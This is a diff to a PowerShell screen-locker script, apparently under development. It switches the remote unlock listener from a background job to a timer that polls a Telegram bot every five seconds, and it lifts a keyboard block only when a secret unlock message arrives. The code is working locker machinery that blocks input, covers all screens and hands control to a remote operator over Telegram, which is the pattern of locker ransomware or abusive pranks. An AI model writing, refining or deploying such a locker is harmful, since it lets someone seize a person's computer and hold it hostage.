@@ -103,28 +103,30 @@ $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form
 }
 
-# TELEGRAM LISTENER TO UNLOCK
-$job = Start-Job -ScriptBlock {
-    $offset = 0
-    $unlock = $using:unlockCommand
-    while ($true) {
-        $url = "https://api.telegram.org/bot$($using:botToken)/getUpdates?timeout=20&offset=$offset"
-        $updates = Invoke-RestMethod -Uri $url -TimeoutSec 25
-        foreach ($update in $updates.result) {
+# TELEGRAM LISTENER (RELIABLE METHOD)
+$offset = 0
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 5000 # every 5 seconds
+
+$timer.Add_Tick({
+    try {
+        $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
+        $response = Invoke-RestMethod $url -UseBasicParsing -TimeoutSec 5
+        foreach ($update in $response.result) {
             $offset = $update.update_id + 1
-            if ($update.message.text -eq $unlock) {
+            if ($update.message.text -eq $unlockCommand) {
                 [System.Windows.Forms.Application]::Exit()
-                break
             }
         }
-        Start-Sleep -Seconds 1
-    }
-}
+    } catch {}
+})
 
-# START APPLICATION MESSAGE LOOP
+$timer.Start()
+
+# START THE APPLICATION MESSAGE LOOP
 [System.Windows.Forms.Application]::Run()
 
-# CLEANUP ON EXIT
+# STOP TIMER ON EXIT
+$timer.Stop()
 [KeyBlocker]::Unblock()
-Stop-Job $job | Out-Null
-Remove-Job $job | Out-Null
+
